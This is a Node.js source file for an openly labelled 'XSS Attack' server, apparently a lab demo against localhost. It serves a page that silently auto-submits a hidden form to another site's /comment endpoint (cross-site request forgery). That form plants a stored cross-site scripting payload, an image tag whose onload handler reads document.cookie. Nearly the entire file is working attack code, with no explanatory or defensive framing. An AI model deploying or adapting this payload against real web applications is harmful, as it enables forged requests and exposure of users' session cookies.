const http = require('http');

const server = http.createServer((req, res) => {
    if (req.method === 'GET' && req.url === '/') {
        res.setHeader('Content-Type', 'text/html');
        res.end(`
            <html>
            <head>
                <title>XSS Attack</title>
            </head>
            <body>
                <h1>XSS Attack Page</h1>
                <script>
                    var form = document.createElement('form');
                    form.setAttribute('method', 'post');
                    form.setAttribute('action', 'http://localhost:3000/comment');
                    var input = document.createElement('input');
                    input.setAttribute('type', 'hidden');
                    input.setAttribute('name', 'comment');
                    input.setAttribute('value', '<img src="http://localhost:4000/cookie_monster.jpg" onload="alert(document.cookie)">');
                    form.appendChild(input);
                    document.body.appendChild(form);
                    form.submit();
                </script>
            </body>
            </html>
        `);
    } else {
        res.statusCode = 404;
        res.end();
    }
});

server.listen(4000, () => {
    console.log('XSS Attack Server running at http://localhost:4000/');
});
